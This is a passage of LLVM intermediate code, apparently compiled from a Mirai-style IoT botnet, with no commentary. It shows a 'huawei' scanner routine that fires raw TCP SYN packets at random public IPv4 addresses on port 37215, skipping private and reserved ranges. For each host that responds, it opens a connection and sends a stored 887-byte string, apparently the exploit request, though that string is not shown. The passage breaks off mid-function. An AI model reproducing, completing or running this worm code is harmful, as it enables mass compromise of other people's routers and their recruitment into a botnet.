  %31 = tail call i32 (i32, i32, ...) @fcntl(i32 %27, i32 3, i32 0) #8
  %32 = or i32 %31, 2048
  %33 = tail call i32 (i32, i32, ...) @fcntl(i32 %27, i32 4, i32 %32) #8
  store i32 1, i32* %1, align 4
  %34 = load i32, i32* @huawei_rsck, align 4
  %35 = bitcast i32* %1 to i8*
  %36 = call i32 @setsockopt(i32 %34, i32 0, i32 3, i8* nonnull %35, i32 4) #8
  %37 = icmp eq i32 %36, 0
  br i1 %37, label %.preheader155.preheader, label %38

.preheader155.preheader:                          ; preds = %30
  br label %.preheader155

; <label>:38:                                     ; preds = %30
  %39 = load i32, i32* @huawei_rsck, align 4
  %40 = call i32 @close(i32 %39) #8
  call void @exit(i32 0) #14
  unreachable

.preheader155:                                    ; preds = %.preheader155.preheader, %.preheader155
  %41 = call i32 @rand_next()
  %42 = trunc i32 %41 to i16
  %43 = call zeroext i16 @ntohs(i16 zeroext %42) #12
  %44 = icmp ult i16 %43, 1024
  br i1 %44, label %.preheader155, label %45

; <label>:45:                                     ; preds = %.preheader155
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 0), align 16
  %46 = call zeroext i16 @htons(i16 zeroext 40) #12
  store i16 %46, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  %47 = call i32 @rand_next()
  %48 = trunc i32 %47 to i16
  store i16 %48, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 9), align 1
  %49 = call zeroext i16 @htons(i16 zeroext -28321) #12
  store i16 %49, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %42, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %50 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %51 = and i16 %50, -241
  %52 = or i16 %51, 80
  store i16 %52, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %53 = call i32 @rand_next()
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %55 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %56 = or i16 %55, 512
  store i16 %56, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %57 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 0
  %58 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 20
  %59 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 0
  %60 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 0
  %61 = bitcast i32* %7 to i8*
  %62 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 16
  %63 = bitcast i8* %62 to i32*
  %64 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 9
  %65 = bitcast i8* %58 to i16*
  %66 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 22
  %67 = bitcast i8* %66 to i16*
  %68 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 32
  %69 = bitcast i8* %68 to i16*
  %70 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 28
  %71 = bitcast i8* %70 to i32*
  %72 = getelementptr inbounds [1514 x i8], [1514 x i8]* %6, i64 0, i64 12
  %73 = bitcast i8* %72 to i32*
  %74 = bitcast %struct.sockaddr_in* %5 to i8*
  %75 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %76 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %77 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %78 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  br label %.loopexit150

.loopexit150.loopexit:                            ; preds = %.loopexit
  br label %.loopexit150

.loopexit150:                                     ; preds = %.loopexit150.loopexit, %45
  %.0128 = phi i32 [ undef, %45 ], [ %.1129, %.loopexit150.loopexit ]
  %79 = load i32, i32* @huawei_fake_time, align 4
  %80 = icmp eq i32 %79, %.0128
  br i1 %80, label %.loopexit154, label %.preheader153

.preheader153:                                    ; preds = %.loopexit150
  store i32 0, i32* %1, align 4
  br label %81

; <label>:81:                                     ; preds = %.preheader153, %81
  call void @llvm.memset.p0i8.i64(i8* nonnull %74, i8 0, i64 16, i32 4, i1 false)
  %82 = call i32 @rand_next()
  %83 = trunc i32 %82 to i16
  store i16 %83, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  %84 = load i32, i32* @LOCAL_ADDR, align 4
  store i32 %84, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 12) to i32*), align 4
  %85 = call fastcc i32 @get_random_ip.76()
  store i32 %85, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  %86 = call zeroext i16 @checksum_generic(i16* bitcast ([40 x i8]* @huawei_scanner_rawpkt to i16*), i32 20) #8
  store i16 %86, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 10) to i16*), align 2
  store i16 %49, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  %87 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %87, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 24) to i32*), align 8
  store i16 0, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  %88 = call zeroext i16 @htons(i16 zeroext 20) #12
  %89 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* bitcast ([40 x i8]* @huawei_scanner_rawpkt to %struct.iphdr*), i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 20), i16 zeroext %88, i32 20) #8
  store i16 %89, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 36) to i16*), align 4
  store i16 2, i16* %75, align 4
  %90 = load i32, i32* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 16) to i32*), align 16
  store i32 %90, i32* %76, align 4
  %91 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %91, i16* %77, align 2
  %92 = load i32, i32* @huawei_rsck, align 4
  %93 = call i64 @sendto(i32 %92, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @huawei_scanner_rawpkt, i64 0, i64 0), i64 40, i32 16384, %struct.sockaddr* nonnull %78, i32 16) #8
  %94 = load i32, i32* %1, align 4
  %95 = add nsw i32 %94, 1
  store i32 %95, i32* %1, align 4
  %96 = icmp slt i32 %95, 160
  br i1 %96, label %81, label %.loopexit154.loopexit

.loopexit154.loopexit:                            ; preds = %81
  br label %.loopexit154

.loopexit154:                                     ; preds = %.loopexit154.loopexit, %.loopexit150
  %.1129 = phi i32 [ %.0128, %.loopexit150 ], [ %79, %.loopexit154.loopexit ]
  %97 = tail call i32* @__errno_location() #12
  store i32 0, i32* %97, align 4
  %98 = load i32, i32* @huawei_rsck, align 4
  %99 = call i64 @recvfrom(i32 %98, i8* nonnull %57, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %100 = trunc i64 %99 to i32
  %101 = icmp slt i32 %100, 1
  br i1 %101, label %.thread, label %.lr.ph167.preheader

.lr.ph167.preheader:                              ; preds = %.loopexit154
  br label %.lr.ph167

.lr.ph167:                                        ; preds = %.lr.ph167.preheader, %.backedge152
  %102 = phi i64 [ %147, %.backedge152 ], [ %99, %.lr.ph167.preheader ]
  %.0127166 = phi i32 [ %.0127.be, %.backedge152 ], [ 0, %.lr.ph167.preheader ]
  %103 = load i32, i32* %97, align 4
  %104 = icmp eq i32 %103, 11
  br i1 %104, label %.thread.loopexit197, label %105

; <label>:105:                                    ; preds = %.lr.ph167
  %sext = shl i64 %102, 32
  %106 = ashr exact i64 %sext, 32
  %107 = icmp ult i64 %106, 40
  br i1 %107, label %.backedge152, label %108

; <label>:108:                                    ; preds = %105
  %109 = load i32, i32* %63, align 16
  %110 = load i32, i32* @LOCAL_ADDR, align 4
  %111 = icmp eq i32 %109, %110
  %112 = load i8, i8* %64, align 1
  %113 = icmp eq i8 %112, 6
  %or.cond181 = and i1 %111, %113
  %114 = load i16, i16* %65, align 4
  %115 = icmp eq i16 %114, %49
  %or.cond183 = and i1 %or.cond181, %115
  %116 = load i16, i16* %67, align 2
  %117 = icmp eq i16 %116, %42
  %or.cond185 = and i1 %or.cond183, %117
  br i1 %or.cond185, label %118, label %.backedge152

; <label>:118:                                    ; preds = %108
  %119 = load i16, i16* %69, align 16
  %120 = and i16 %119, 5888
  %121 = icmp eq i16 %120, 4608
  br i1 %121, label %122, label %.backedge152

; <label>:122:                                    ; preds = %118
  %123 = load i32, i32* %71, align 4
  %124 = call i32 @ntohl(i32 %123) #12
  %125 = add i32 %124, -1
  %126 = call i32 @htonl(i32 %125) #12
  %127 = load i32, i32* %73, align 4
  %128 = icmp eq i32 %126, %127
  br i1 %128, label %.preheader149, label %.backedge152

.preheader149:                                    ; preds = %122
  %129 = icmp slt i32 %.0127166, 128
  br i1 %129, label %.lr.ph, label %.thread.loopexit197

.lr.ph:                                           ; preds = %.preheader149
  %130 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %131 = sext i32 %.0127166 to i64
  br label %132

; <label>:132:                                    ; preds = %.lr.ph, %136
  %indvars.iv = phi i64 [ %131, %.lr.ph ], [ %indvars.iv.next, %136 ]
  %133 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv, i32 2
  %134 = load i32, i32* %133, align 8
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %138, label %136

; <label>:136:                                    ; preds = %132
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %137 = icmp slt i64 %indvars.iv.next, 128
  br i1 %137, label %132, label %.thread.loopexit

; <label>:138:                                    ; preds = %132
  %139 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv
  %140 = icmp eq %struct.exploit_scanner_connection* %139, null
  br i1 %140, label %.thread.loopexit197, label %141

; <label>:141:                                    ; preds = %138
  %142 = trunc i64 %indvars.iv to i32
  %143 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv, i32 3
  store i32 %126, i32* %143, align 4
  %144 = load i16, i16* %65, align 4
  %145 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %130, i64 %indvars.iv, i32 4
  store i16 %144, i16* %145, align 8
  call fastcc void @huawei_setup_connection(%struct.exploit_scanner_connection* nonnull %139)
  br label %.backedge152

.backedge152:                                     ; preds = %141, %105, %108, %122, %118
  %.0127.be = phi i32 [ %.0127166, %105 ], [ %.0127166, %108 ], [ %.0127166, %122 ], [ %142, %141 ], [ %.0127166, %118 ]
  store i32 0, i32* %97, align 4
  %146 = load i32, i32* @huawei_rsck, align 4
  %147 = call i64 @recvfrom(i32 %146, i8* nonnull %57, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #8
  %148 = trunc i64 %147 to i32
  %149 = icmp slt i32 %148, 1
  br i1 %149, label %.thread.loopexit197, label %.lr.ph167

.thread.loopexit:                                 ; preds = %136
  br label %.thread

.thread.loopexit197:                              ; preds = %.preheader149, %.lr.ph167, %.backedge152, %138
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit197, %.thread.loopexit, %.loopexit154
  %150 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %59) #8, !srcloc !13
  %151 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %60) #8, !srcloc !14
  store i32 0, i32* %1, align 4
  br label %152

; <label>:152:                                    ; preds = %.thread, %.thread145
  %.0130175 = phi i32 [ 0, %.thread ], [ %.1131, %.thread145 ]
  %.0132174 = phi i32 [ 0, %.thread ], [ %.1133, %.thread145 ]
  %storemerge136173 = phi i32 [ 0, %.thread ], [ %198, %.thread145 ]
  %153 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %154 = sext i32 %storemerge136173 to i64
  %155 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154
  %156 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154, i32 2
  %157 = load i32, i32* %156, align 8
  %158 = icmp eq i32 %157, 0
  br i1 %158, label %.thread145, label %159

; <label>:159:                                    ; preds = %152
  %160 = load i32, i32* @huawei_fake_time, align 4
  %161 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154, i32 1
  %162 = load i32, i32* %161, align 4
  %163 = sub i32 %160, %162
  %164 = icmp ugt i32 %163, 5
  br i1 %164, label %165, label %170

; <label>:165:                                    ; preds = %159
  %166 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %155, i64 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = call i32 @close(i32 %167) #8
  store i32 -1, i32* %166, align 8
  store i32 0, i32* %156, align 8
  %169 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %153, i64 %154, i32 6, i64 0
  call void @util_zero(i8* %169, i32 256)
  %.pre190 = load i32, i32* %1, align 4
  br label %.thread145

; <label>:170:                                    ; preds = %159
  switch i32 %157, label %184 [
    i32 1, label %171
    i32 3, label %171
    i32 4, label %171
  ]

; <label>:171:                                    ; preds = %170, %170, %170
  %172 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %155, i64 0, i32 0
  %173 = load i32, i32* %172, align 8
  %174 = srem i32 %173, 64
  %175 = zext i32 %174 to i64
  %176 = shl i64 1, %175
  %177 = sdiv i32 %173, 64
  %178 = sext i32 %177 to i64
  %179 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %178
  %180 = load i64, i64* %179, align 8
  %181 = or i64 %176, %180
  store i64 %181, i64* %179, align 8
  %182 = load i32, i32* %172, align 8
  %183 = icmp sgt i32 %182, %.0132174
  %..0132 = select i1 %183, i32 %182, i32 %.0132174
  br label %.thread145

; <label>:184:                                    ; preds = %170
  %185 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %155, i64 0, i32 0
  %186 = load i32, i32* %185, align 8
  %187 = srem i32 %186, 64
  %188 = zext i32 %187 to i64
  %189 = shl i64 1, %188
  %190 = sdiv i32 %186, 64
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %191
  %193 = load i64, i64* %192, align 8
  %194 = or i64 %189, %193
  store i64 %194, i64* %192, align 8
  %195 = load i32, i32* %185, align 8
  %196 = icmp sgt i32 %195, %.0130175
  %..0130 = select i1 %196, i32 %195, i32 %.0130175
  br label %.thread145

.thread145:                                       ; preds = %152, %184, %171, %165
  %197 = phi i32 [ %.pre190, %165 ], [ %storemerge136173, %171 ], [ %storemerge136173, %184 ], [ %storemerge136173, %152 ]
  %.1133 = phi i32 [ %.0132174, %165 ], [ %..0132, %171 ], [ %.0132174, %184 ], [ %.0132174, %152 ]
  %.1131 = phi i32 [ %.0130175, %165 ], [ %.0130175, %171 ], [ %..0130, %184 ], [ %.0130175, %152 ]
  %198 = add nsw i32 %197, 1
  store i32 %198, i32* %1, align 4
  %199 = icmp slt i32 %198, 128
  br i1 %199, label %152, label %200

; <label>:200:                                    ; preds = %.thread145
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %4, align 16
  %201 = icmp sgt i32 %.1133, %.1131
  %202 = select i1 %201, i32 %.1133, i32 %.1131
  %203 = add nsw i32 %202, 1
  %204 = call i32 @select(i32 %203, %struct.fd_set* nonnull %2, %struct.fd_set* nonnull %3, %struct.fd_set* null, %struct.timeval* nonnull %tmpcast) #8
  %205 = call i64 @time(i64* null) #8
  %206 = trunc i64 %205 to i32
  store i32 %206, i32* @huawei_fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %207

; <label>:207:                                    ; preds = %200, %.loopexit
  %storemerge137178 = phi i32 [ 0, %200 ], [ %297, %.loopexit ]
  %208 = load %struct.exploit_scanner_connection*, %struct.exploit_scanner_connection** @conn_table, align 8
  %209 = sext i32 %storemerge137178 to i64
  %210 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209
  %211 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %210, i64 0, i32 0
  %212 = load i32, i32* %211, align 8
  %213 = icmp eq i32 %212, -1
  br i1 %213, label %.loopexit, label %214

; <label>:214:                                    ; preds = %207
  %215 = sdiv i32 %212, 64
  %216 = sext i32 %215 to i64
  %217 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %3, i64 0, i32 0, i64 %216
  %218 = load i64, i64* %217, align 8
  %219 = srem i32 %212, 64
  %220 = zext i32 %219 to i64
  %221 = shl i64 1, %220
  %222 = and i64 %218, %221
  %223 = icmp eq i64 %222, 0
  br i1 %223, label %249, label %224

; <label>:224:                                    ; preds = %214
  store i32 0, i32* %7, align 4
  store i32 4, i32* %8, align 4
  %225 = load i32, i32* %211, align 8
  %226 = call i32 @getsockopt(i32 %225, i32 1, i32 4, i8* nonnull %61, i32* nonnull %8) #8
  %227 = load i32, i32* %7, align 4
  %228 = or i32 %227, %226
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %230, label %245

; <label>:230:                                    ; preds = %224
  %231 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 2
  %232 = load i32, i32* %231, align 8
  switch i32 %232, label %244 [
    i32 3, label %233
    i32 4, label %241
  ]

; <label>:233:                                    ; preds = %230
  %234 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 8, i64 0
  %235 = call i32 @util_strcpy(i8* %234, i8* getelementptr inbounds ([887 x i8], [887 x i8]* @.str.77, i64 0, i64 0))
  %236 = load i32, i32* %211, align 8
  %237 = call i32 @util_strlen(i8* %234)
  %238 = sext i32 %237 to i64
  %239 = call i64 @send(i32 %236, i8* %234, i64 %238, i32 16384) #8
  call void @util_zero(i8* %234, i32 2560)
  %240 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 0
  call void @util_zero(i8* %240, i32 256)
  store i32 4, i32* %231, align 8
  br label %.loopexit

; <label>:241:                                    ; preds = %230
  %242 = load i32, i32* %211, align 8
  %243 = call i32 @close(i32 %242) #8
  store i32 -1, i32* %211, align 8
  store i32 0, i32* %231, align 8
  br label %.loopexit

; <label>:244:                                    ; preds = %230
  store i32 3, i32* %231, align 8
  %.pre191 = load i32, i32* %211, align 8
  br label %249

; <label>:245:                                    ; preds = %224
  %246 = load i32, i32* %211, align 8
  %247 = call i32 @close(i32 %246) #8
  store i32 -1, i32* %211, align 8
  %248 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 2
  store i32 0, i32* %248, align 8
  br label %.loopexit

; <label>:249:                                    ; preds = %214, %244
  %250 = phi i32 [ %212, %214 ], [ %.pre191, %244 ]
  %251 = sdiv i32 %250, 64
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %2, i64 0, i32 0, i64 %252
  %254 = load i64, i64* %253, align 8
  %255 = srem i32 %250, 64
  %256 = zext i32 %255 to i64
  %257 = shl i64 1, %256
  %258 = and i64 %257, %254
  %259 = icmp eq i64 %258, 0
  br i1 %259, label %.loopexit, label %.preheader

.preheader:                                       ; preds = %249
  %260 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 2
  %261 = load i32, i32* %260, align 8
  %262 = icmp eq i32 %261, 0
  br i1 %262, label %.loopexit, label %.lr.ph176

.lr.ph176:                                        ; preds = %.preheader
  %263 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 5
  %264 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 0
  %265 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 64
  %266 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 1
  br label %267

; <label>:267:                                    ; preds = %.lr.ph176, %.backedge
  %268 = load i32, i32* %263, align 4
  %269 = icmp eq i32 %268, 256
  br i1 %269, label %270, label %271

; <label>:270:                                    ; preds = %267
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %264, i8* nonnull %265, i64 192, i32 1, i1 false)
  store i32 192, i32* %263, align 4
  br label %271

; <label>:271:                                    ; preds = %270, %267
  store i32 0, i32* %97, align 4
  %272 = load i32, i32* %211, align 8
  %273 = load i32, i32* %263, align 4
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 %274
  %276 = sub nsw i32 256, %273
  %277 = call i32 @huawei_recv_strip_null(i32 %272, i8* %275, i32 %276, i32 16384)
  switch i32 %277, label %289 [
    i32 0, label %.thread148
    i32 -1, label %278
  ]

.thread148:                                       ; preds = %271
  store i32 104, i32* %97, align 4
  br label %280

; <label>:278:                                    ; preds = %271
  %.pr147 = load i32, i32* %97, align 4
  %279 = icmp eq i32 %.pr147, 11
  br i1 %279, label %.loopexit.loopexit, label %280

; <label>:280:                                    ; preds = %.thread148, %278
  %281 = load i32, i32* %260, align 8
  %282 = icmp eq i32 %281, 3
  %283 = load i32, i32* %211, align 8
  %284 = call i32 @close(i32 %283) #8
  br i1 %282, label %285, label %288

; <label>:285:                                    ; preds = %280
  call fastcc void @huawei_setup_connection(%struct.exploit_scanner_connection* nonnull %210)
  br label %.backedge

.backedge:                                        ; preds = %285, %289
  %286 = load i32, i32* %260, align 8
  %287 = icmp eq i32 %286, 0
  br i1 %287, label %.loopexit.loopexit, label %267

; <label>:288:                                    ; preds = %280
  store i32 -1, i32* %211, align 8
  store i32 0, i32* %260, align 8
  call void @util_zero(i8* nonnull %264, i32 256)
  br label %.loopexit

; <label>:289:                                    ; preds = %271
  %290 = load i32, i32* %263, align 4
  %291 = add nsw i32 %290, %277
  store i32 %291, i32* %263, align 4
  %292 = load i32, i32* @huawei_fake_time, align 4
  store i32 %292, i32* %266, align 4
  %293 = call i32 @util_strlen(i8* nonnull %264)
  %294 = sext i32 %293 to i64
  %295 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %208, i64 %209, i32 6, i64 %294
  store i8 0, i8* %295, align 1
  br label %.backedge

.loopexit.loopexit:                               ; preds = %278, %.backedge
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %249, %288, %207, %245, %241, %233
  %296 = load i32, i32* %1, align 4
  %297 = add nsw i32 %296, 1
  store i32 %297, i32* %1, align 4
  %298 = icmp slt i32 %297, 128
  br i1 %298, label %207, label %.loopexit150.loopexit
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_random_ip.76() unnamed_addr #1 {
  br label %.critedge

.critedge:                                        ; preds = %.critedge.backedge, %0
  %1 = tail call i32 @rand_next()
  %2 = tail call i64 @time(i64* null) #8
  %3 = trunc i64 %2 to i32
  tail call void @srand(i32 %3) #8
  %4 = lshr i32 %1, 8
  %trunc = trunc i32 %1 to i8
  switch i8 %trunc, label %18 [
    i8 127, label %.critedge.backedge
    i8 0, label %.critedge.backedge
    i8 3, label %.critedge.backedge
    i8 15, label %.critedge.backedge
    i8 16, label %.critedge.backedge
    i8 56, label %.critedge.backedge
    i8 10, label %.critedge.backedge
    i8 -64, label %5
    i8 -84, label %8
    i8 100, label %11
    i8 -87, label %14
    i8 -58, label %15
  ]

; <label>:5:                                      ; preds = %.critedge
  %6 = and i32 %4, 255
  %7 = icmp eq i32 %6, 168
  br i1 %7, label %.critedge.backedge, label %switch.early.test.thread

; <label>:8:                                      ; preds = %.critedge
  %9 = and i32 %4, 240
  %10 = icmp eq i32 %9, 16
  br i1 %10, label %.critedge.backedge, label %switch.early.test.thread

; <label>:11:                                     ; preds = %.critedge
  %12 = and i32 %4, 255
  %.off = add nsw i32 %12, -64
  %13 = icmp ult i32 %.off, 63
  br i1 %13, label %.critedge.backedge, label %switch.early.test.thread

; <label>:14:                                     ; preds = %.critedge
  %.old = and i32 %4, 255
  %.old81 = icmp eq i32 %.old, 255
  br i1 %.old81, label %.critedge.backedge, label %switch.early.test.thread

.critedge.backedge:                               ; preds = %14, %5, %8, %11, %15, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %.critedge, %18, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test, %switch.early.test
  br label %.critedge

; <label>:15:                                     ; preds = %.critedge
  %16 = and i32 %4, 254
  %17 = icmp eq i32 %16, 18
  br i1 %17, label %.critedge.backedge, label %switch.early.test.thread

; <label>:18:                                     ; preds = %.critedge
  %19 = and i32 %1, 224
  %.old85 = icmp ugt i32 %19, 223
  br i1 %.old85, label %.critedge.backedge, label %switch.early.test

switch.early.test:                                ; preds = %18
  switch i8 %trunc, label %switch.early.test.thread [
    i8 -41, label %.critedge.backedge
    i8 -42, label %.critedge.backedge
    i8 55, label %.critedge.backedge
    i8 33, label %.critedge.backedge
    i8 30, label %.critedge.backedge
    i8 29, label %.critedge.backedge
    i8 28, label %.critedge.backedge
    i8 26, label %.critedge.backedge
    i8 22, label %.critedge.backedge
    i8 21, label %.critedge.backedge
    i8 11, label %.critedge.backedge
    i8 7, label %.critedge.backedge
    i8 6, label %.critedge.backedge
  ]

switch.early.test.thread:                         ; preds = %14, %5, %8, %11, %switch.early.test, %15
  %20 = tail call i32 @rand() #8
  %21 = srem i32 %20, 3
  %22 = icmp ult i32 %21, 3
  br i1 %22, label %switch.lookup, label %32

switch.lookup:                                    ; preds = %switch.early.test.thread
  %23 = lshr i32 %1, 24
  %24 = sext i32 %21 to i64
  %switch.gep = getelementptr inbounds [3 x i32], [3 x i32]* @switch.table, i64 0, i64 %24
  %switch.load = load i32, i32* %switch.gep, align 4
  %25 = shl i32 %4, 16
  %26 = and i32 %25, 16711680
  %27 = and i32 %4, 65280
  %28 = or i32 %27, %23
  %29 = or i32 %28, %26
  %30 = or i32 %29, %switch.load
  %31 = tail call i32 @htonl(i32 %30) #12
  br label %32

; <label>:32:                                     ; preds = %switch.early.test.thread, %switch.lookup
  %.0 = phi i32 [ undef, %switch.early.test.thread ], [ %31, %switch.lookup ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @huawei_setup_connection(%struct.exploit_scanner_connection* nocapture) unnamed_addr #1 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.exploit_scanner_connection, %struct.exploit_scanner_connection* %0, i64 0, i32 0
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #8
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #8
